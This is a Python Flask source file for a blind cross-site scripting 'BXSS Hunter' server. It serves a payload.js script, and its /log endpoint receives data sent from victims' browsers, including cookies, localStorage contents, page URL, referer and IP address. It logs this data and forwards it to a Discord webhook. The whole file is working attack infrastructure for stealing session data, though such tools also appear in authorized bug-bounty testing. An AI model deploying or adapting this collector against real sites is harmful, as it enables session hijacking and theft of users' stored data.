from flask import Flask, request, jsonify
import logging
from datetime import datetime
import requests
from dotenv import load_dotenv
import os

load_dotenv()
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

app = Flask(__name__)
logging.basicConfig(filename='bxss.log', level=logging.INFO)

def send_to_discord(data):
    embed = {
        "title": "🧠 BXSS Hunter Alert",
        "color": 16711680,
        "fields": [
            {"name": "📍 URL", "value": data.get("url", "N/A"), "inline": False},
            {"name": "🌐 Origin", "value": data.get("origin", "N/A"), "inline": True},
            {"name": "📤 Referer", "value": data.get("referer", "N/A"), "inline": True},
            {"name": "👤 User-Agent", "value": data.get("userAgent", "N/A")[:1024], "inline": False},
            {"name": "🍪 Cookies", "value": data.get("cookies", "None")[:1024], "inline": False},
            {"name": "📦 Local Storage", "value": data.get("localStorage", "N/A")[:1024], "inline": False},
            {"name": "🕐 Time", "value": data.get("timestamp", "N/A"), "inline": True},
            {"name": "🛠️ Payload URL", "value": data.get("payloadURL", "N/A"), "inline": True},
            {"name": "🖥️ IP Address", "value": data.get("ip", "N/A"), "inline": True}
        ],
        "footer": {"text": "BXSS Logger"},
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Failed to send Discord alert: {e}")

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    data['ip'] = request.remote_addr
    data['received_at'] = datetime.utcnow().isoformat()

    log = "\n--- BXSS Report ---\n"
    for key, val in data.items():
        log += f"{key.upper()}:\n{val}\n\n"
    log += "-------------------\n"

    print(log)
    logging.info(log)

    send_to_discord(data)
    return jsonify({"status": "received"}), 200

@app.route('/payload.js')
def serve_payload():
    with open('payload.js') as f:
        return f.read(), 200, {'Content-Type': 'application/javascript'}

@app.route('/')
def index():
    return 'BXSS Hunter Active.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
